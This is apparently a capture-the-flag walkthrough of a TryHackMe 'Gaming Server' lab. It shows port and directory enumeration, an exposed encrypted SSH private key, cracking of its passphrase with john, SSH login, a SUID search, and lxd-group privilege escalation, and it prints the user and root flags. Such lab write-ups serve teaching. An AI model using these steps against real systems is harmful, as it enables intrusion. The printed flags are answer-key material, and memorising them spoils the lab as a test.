# THM - Gaming Server

## Date Commenced 17MAR2022


---
## IP Address
### Attempt 1
export IP=10.10.205.253


---
## Open Ports
Basic **nmap** scan to get the open ports:

>22
>
>80

>nmap $IP -vvv -oN Results/nmap01.log

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-17 09:14 EDT
Initiating Ping Scan at 09:14
Scanning 10.10.205.253 [2 ports]
Completed Ping Scan at 09:14, 0.27s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:14
Completed Parallel DNS resolution of 1 host. at 09:14, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 09:14
Scanning 10.10.205.253 [1000 ports]
Discovered open port 80/tcp on 10.10.205.253
Discovered open port 22/tcp on 10.10.205.253
Increasing send delay for 10.10.205.253 from 0 to 5 due to 112 out of 372 dropped probes since last increase.
Increasing send delay for 10.10.205.253 from 5 to 10 due to 11 out of 14 dropped probes since last increase.
Increasing send delay for 10.10.205.253 from 10 to 20 due to 11 out of 14 dropped probes since last increase.
Increasing send delay for 10.10.205.253 from 20 to 40 due to 11 out of 14 dropped probes since last increase.
Completed Connect Scan at 09:15, 42.61s elapsed (1000 total ports)
Nmap scan report for 10.10.205.253
Host is up, received syn-ack (0.26s latency).
Scanned at 2022-03-17 09:14:50 EDT for 43s
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE  REASON
22/tcp   open     ssh      syn-ack
80/tcp   open     http     syn-ack
1334/tcp filtered writesrv no-response

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 42.94 seconds
```

Then perform a more advanced nmap scan:

> nmap $IP -sC -sV -A -p 22,80,6500,6501 -oN Results/nmap02.log

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-17 09:18 EDT
Nmap scan report for 10.10.205.253
Host is up (0.23s latency).

PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp   open   http       Apache httpd 2.4.29 ((Ubuntu))
|_http-title: House of danak
|_http-server-header: Apache/2.4.29 (Ubuntu)
6500/tcp closed boks
6501/tcp closed boks_servc
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.00 seconds
```


---
## Web Page
Nothing to click really, but the source page gives up a possible user *john*:

![WebPage](Images/01-webpage.png)

![UserJohn](Images/02-userjohnmaybe.png)



---
## Enumerate the Web Page
Using **Gobuster** to enumerate for directories:

> sudo gobuster dir --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$IP -t=200 -o ./Results/gobuster01.log 2> /dev/null

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.205.253
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/17 09:23:53 Starting gobuster in directory enumeration mode
===============================================================
/secret               (Status: 301) [Size: 315] [--> http://10.10.205.253/secret/]
/server-status        (Status: 403) [Size: 278]                                   
===============================================================
2022/03/17 09:31:15 Finished
===============================================================
```

Hmmm...might have to switch to **dirsearch** as **gobuster** is not always giving up the goods:

> dirsearch -u http://$IP -e * 

```

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                
 (_||| _) (/_(_|| (_| )                                                                                                                                         
                                                                                                                                                                
Extensions: gobuster01.log | HTTP method: GET | Threads: 30 | Wordlist size: 9009

Output File: /home/kali/.dirsearch/reports/10.10.205.253/_22-03-17_10-06-15.txt

Error Log: /home/kali/.dirsearch/logs/errors-22-03-17_10-06-15.log

Target: http://10.10.205.253/

[10:06:15] Starting: 
[10:06:23] 403 -  278B  - /.ht_wsr.txt                                     
[10:06:23] 403 -  278B  - /.htaccess.bak1
[10:06:23] 403 -  278B  - /.htaccess.orig
[10:06:23] 403 -  278B  - /.htaccess.sample
[10:06:23] 403 -  278B  - /.htaccess.save
[10:06:23] 403 -  278B  - /.htaccess_orig
[10:06:23] 403 -  278B  - /.htaccess_sc
[10:06:23] 403 -  278B  - /.htaccess_extra
[10:06:23] 403 -  278B  - /.htaccessBAK
[10:06:23] 403 -  278B  - /.htaccessOLD2
[10:06:23] 403 -  278B  - /.htaccessOLD
[10:06:23] 403 -  278B  - /.htm                                            
[10:06:23] 403 -  278B  - /.html
[10:06:23] 403 -  278B  - /.htpasswd_test
[10:06:23] 403 -  278B  - /.htpasswds
[10:06:23] 403 -  278B  - /.httr-oauth
[10:06:26] 403 -  278B  - /.php                                            
[10:07:04] 200 -    3KB - /index.html                                       
[10:07:21] 200 -   33B  - /robots.txt                                       
[10:07:22] 200 -  941B  - /secret/                                          
[10:07:22] 301 -  315B  - /secret  ->  http://10.10.205.253/secret/         
[10:07:22] 403 -  278B  - /server-status/                                   
[10:07:22] 403 -  278B  - /server-status                                    
[10:07:30] 200 -    1KB - /uploads/                                         
[10:07:30] 301 -  316B  - /uploads  ->  http://10.10.205.253/uploads/       
                                                                             
Task Completed                                                        
```

**dirsearch** galso shows an *uploads* folder.


---
## Secret
**Gobuster** revealed a folder *secret* that has a file called *secretkey*, which contains an RSA key:

![WebPagesSecret](03-webpagesecret.png)

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY-----
```


---
## Gimme Answers John
Tried to access the server using **SSH**, but was denied and asked for a passphrase. Gonna rip the hash through **john** and see what comes out.

```
┌──(kali㉿kali)-[~/THM/GamingServer]
└─$ chmod 600 id_rsa   
                                                                                                                                                                
┌──(kali㉿kali)-[~/THM/GamingServer]
└─$ ssh -i id_rsa john@10.10.205.253
Enter passphrase for key 'id_rsa': 
```

Gave up his secrets pretty easily:

```
┌──(kali㉿kali)-[~/THM/GamingServer]
└─$ /usr/share/john/ssh2john.py id_rsa > johnhash
                                                                                                                                                                
┌──(kali㉿kali)-[~/THM/GamingServer]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt johnhash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (id_rsa)     
1g 0:00:00:00 DONE (2022-03-17 09:31) 50.00g/s 25600p/s 25600c/s 25600C/s genesis..letmein
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Try the **SSH** again with the passphrase *letmein*, and a magic shell appears:

```
──(kali㉿kali)-[~/THM/GamingServer]
└─$ ssh -i id_rsa john@10.10.205.253                         
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


0 packages can be updated.
0 updates are security updates.


Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
john@exploitable:~$ 
```


---
## user.txt
Located in *john*s home directory, the hash is:

> a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e

```
john@exploitable:~$ ls -lashS
total 60K
 12K -rw------- 1 root root  12K Jul 27  2020 .viminfo
4.0K drwxr-xr-x 8 john john 4.0K Jul 27  2020 .
4.0K drwxr-xr-x 3 root root 4.0K Feb  5  2020 ..
4.0K drwx------ 2 john john 4.0K Feb  5  2020 .cache
4.0K drwxr-x--- 3 john john 4.0K Jul 27  2020 .config
4.0K drwx------ 3 john john 4.0K Feb  5  2020 .gnupg
4.0K drwxrwxr-x 3 john john 4.0K Jul 27  2020 .local
4.0K drwx------ 2 john john 4.0K Feb  5  2020 .ssh
4.0K drwxr-xr-x 2 root root 4.0K Feb  5  2020 .vim
4.0K -rw-r--r-- 1 john john 3.7K Apr  4  2018 .bashrc
4.0K -rw-r--r-- 1 john john  807 Apr  4  2018 .profile
4.0K -rw-r--r-- 1 john john  220 Apr  4  2018 .bash_logout
4.0K -rw-rw-r-- 1 john john   33 Feb  5  2020 user.txt
   0 lrwxrwxrwx 1 john john    9 Jul 27  2020 .bash_history -> /dev/null
   0 -rw-r--r-- 1 john john    0 Feb  5  2020 .sudo_as_admin_successful
john@exploitable:~$ cat user.txt
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```


---
## Linux Enum

### sudo
No password for *john* so no sudo.

## SUID
Search for some goodies:

> find / -perm -4000 2> /dev/null

```
/bin/mount
/bin/umount
/bin/su
/bin/fusermount
/bin/ping
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/at
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/newuidmap
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/7270/bin/mount
/snap/core/7270/bin/ping
/snap/core/7270/bin/ping6
/snap/core/7270/bin/su
/snap/core/7270/bin/umount
/snap/core/7270/usr/bin/chfn
/snap/core/7270/usr/bin/chsh
/snap/core/7270/usr/bin/gpasswd
/snap/core/7270/usr/bin/newgrp
/snap/core/7270/usr/bin/passwd
/snap/core/7270/usr/bin/sudo
/snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/7270/usr/lib/openssh/ssh-keysign
/snap/core/7270/usr/lib/snapd/snap-confine
/snap/core/7270/usr/sbin/pppd
```


---
## SNAP!!
Try to exploit **snap**,

> searchsploit snap

```
------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                |  Path
------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Denver IP Camera SHO-110 - Unauthenticated Snapshot                                                                           | hardware/webapps/50162.txt
IBM AIX 4.2.1 - 'snap' Insecure Temporary File Creation                                                                       | aix/local/19300.txt
iScripts EasySnaps 2.0 - Multiple SQL Injections                                                                              | php/webapps/14162.txt
Microsoft Access - 'Snapview.ocx 10.0.5529.0' ActiveX Remote File Download                                                    | windows/remote/6124.c
Microsoft Access 97/2000/2002 Snapshot Viewer - ActiveX Control Parameter Buffer Overflow                                     | windows/remote/23095.c
Secure Computing SnapGear Management Console SG560 3.1.5 - Arbitrary File Read                                                | hardware/webapps/48556.txt
snap - seccomp BBlacklist for TIOCSTI can be Circumvented                                                                     | linux/dos/46594.c
snapd < 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (1)                                                           | linux/local/46361.py
snapd < 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (2)                                                           | linux/local/46362.py
SnapGear Management Console SG560 3.1.5 - Cross-Site Request Forgery (Add Super User)                                         | hardware/webapps/48554.txt
SnapProof - 'page.php' SQL Injection                                                                                          | php/webapps/16257.txt
SnapProof - 'retPageID' Cross-Site Scripting                                                                                  | php/webapps/35401.txt
Snaps! Gallery 1.4.4 - Remote User Pass Change                                                                                | php/webapps/3900.php
Snapshot Viewer for Microsoft Access - ActiveX Control Arbitrary File Download (Metasploit)                                   | windows/remote/16605.rb
SnapStream Personal Video Station 1.2 a - PVS Directory Traversal                                                             | windows/remote/21030.txt
SnapStream PVS 1.2 - Plaintext Password                                                                                       | windows/remote/21035.txt
SnapStream PVS Lite 2.0 - Cross-Site Scripting                                                                                | windows/remote/23529.txt
SnipSnap 0.5.2 - HTTP Response Splitting                                                                                      | multiple/remote/24598.txt
------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Try the exploit *linux/local/46362.py*:


No Go!

![DirtySockNoGo](Images/04-dirtysocknogo.png)


---
## Linpeas.sh
Moar enums...

### lxd
Follow another rabbit...trying out this exploit:

> https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

It has **sooooooooooo** many steps!! Oh, why cant this be easy!?!

It kind of was easy, just follow the steps exactly.

![lxcPrivEsc](Images/05-lxcprivesc.png)

Got me some root!

> 2e337b8c9f3aff0c2b3e8d4e6a7c88fc


